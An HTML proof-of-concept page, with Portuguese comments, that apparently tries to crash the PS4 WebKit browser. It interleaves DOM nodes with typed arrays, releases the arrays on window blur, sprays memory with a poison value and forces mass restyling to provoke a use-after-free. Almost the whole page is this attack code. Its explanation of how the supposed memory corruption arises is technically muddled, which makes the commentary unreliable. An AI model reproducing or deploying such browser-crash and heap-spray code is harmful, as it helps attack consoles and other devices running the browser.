<!DOCTYPE html>
<html>
<head>
    <title>PS4 RENDER TREE CRASHER</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; overflow: hidden; }
        .target { width: 10px; height: 10px; background: #333; display: inline-block; margin: 1px; }
        #container { width: 100%; height: 200px; overflow: hidden; background: #111; border: 1px solid #444; }
        iframe { width: 90%; height: 350px; border: 4px solid #f00; background: #fff; margin: 10px auto; display: block;}
        button { padding: 15px 30px; font-size: 1.2em; cursor: pointer; background: #d00; color: white; border: 2px solid #fff; font-weight: bold; }
    </style>
</head>
<body>

<h1>RENDER TREE CRASHER</h1>
<h3>Técnica: Corromper DOM e Forçar Repaint (Simula UI Refresh)</h3>

<iframe id="trigger_frame" srcdoc="
    <html>
    <body style='background:#200; color:#fff; text-align:center'>
        <h3>ZONA DO GATILHO</h3>
        <button onclick='startSequence()' style='padding:15px; background:red; color:white; font-weight:bold; border:2px solid white;'>
            INICIAR DESTRUIÇÃO VISUAL
        </button>
        <div id='status'>Pronto.</div>
        
        <div id='dom_field'></div>

        <script>
            var victims = [];
            var spray = [];
            var domNodes = [];
            const COUNT = 10000;
            const POISON = 2.121995791e-314; // 0x4141...

            function startSequence() {
                document.getElementById('status').innerText = '1. Criando Elementos DOM + Heap...';
                
                var container = document.getElementById('dom_field');
                
                // 1. SETUP MISTO (HEAP + DOM)
                // Tentamos colocar Arrays perto de Elementos HTML na memória
                for(let i=0; i<5000; i++) {
                    // Cria um elemento visual
                    let div = document.createElement('div');
                    div.style.width = '10px';
                    div.style.height = '10px';
                    div.style.backgroundColor = 'blue';
                    div.id = 'node_' + i;
                    container.appendChild(div);
                    domNodes.push(div);

                    // Cria o array vítima (buraco)
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }

                document.getElementById('status').innerText = '2. APERTE OPTIONS AGORA!';
                
                // Fullscreen
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    // 3. O ATAQUE (UAF)
                    victims = null; // Libera os arrays entre os Divs
                    
                    // Spray Massivo (Tenta cobrir os Divs vizinhos)
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(POISON);
                        spray.push(s);
                    }

                    document.getElementById('status').innerText = '3. FORÇANDO REPAINT (Estilo)...';

                    // 4. O GATILHO DE RENDERIZAÇÃO
                    // Isso simula o feedback visual do botão 'Atualizar'
                    // Força o navegador a recalcular o estilo de todos os nós.
                    // Se a memória do nó estiver corrompida -> CRASH.
                    
                    setTimeout(function() {
                        try {
                            // Loop pesado de alteração de estilo
                            for(let i=0; i<domNodes.length; i++) {
                                // Acessar .style força o WebKit a ler a estrutura interna
                                domNodes[i].style.backgroundColor = 'red';
                                domNodes[i].style.display = 'none'; // Força Reflow (Recalculo de Layout)
                                domNodes[i].innerHTML = 'CRASH';    // Força Rebuild
                            }
                            
                            // Se ainda estiver vivo, tenta destruir tudo
                            container.innerHTML = ''; 
                            
                            // Golpe final: Força scroll
                            window.scrollBy(0, 100);

                        } catch(e) {}
                    }, 50);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema...</div>

</body>
</html>
